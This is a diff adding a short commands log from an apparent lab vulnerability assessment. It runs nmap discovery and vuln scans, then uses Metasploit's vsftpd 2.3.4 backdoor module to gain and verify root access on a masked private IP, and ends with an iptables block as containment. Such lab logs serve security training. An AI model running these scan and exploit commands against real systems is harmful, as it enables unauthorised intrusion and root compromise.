@@ -1,0 +1,48 @@
+# COMMANDS & SCRIPTS LOG
+# Project: Vulnerability Assessment
+# Date: November 29, 2025
+
+# --- STEP 1: NETWORK DISCOVERY ---
+# Verify IP configuration
+ifconfig
+
+# Ping target to ensure connectivity
+ping 192.168.x.x
+
+# --- STEP 2: SCANNING (NMAP) ---
+# Aggressive scan for service version detection
+nmap -sV -T4 -O -F 192.168.x.x
+
+# Specific vulnerability scan script
+nmap --script vuln 192.168.x.x
+
+# --- STEP 3: EXPLOITATION (METASPLOIT) ---
+# Launch Metasploit Console
+msfconsole
+
+# Search for vsftpd exploit
+search vsftpd
+
+# Use the specific backdoor module
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+# Configure payload
+set RHOSTS 192.168.x.x
+set RPORT 21
+
+# Execute exploit
+exploit
+
+# Verify Root Access
+whoami
+id
+
+# --- STEP 4: INCIDENT RESPONSE (CONTAINMENT) ---
+# Check iptables status
+sudo iptables -L
+
+# BLOCK the attacker IP (Containment Script)
+sudo iptables -A INPUT -s 192.168.x.x -j DROP
+
+# Verify the block
+sudo iptables -L -v
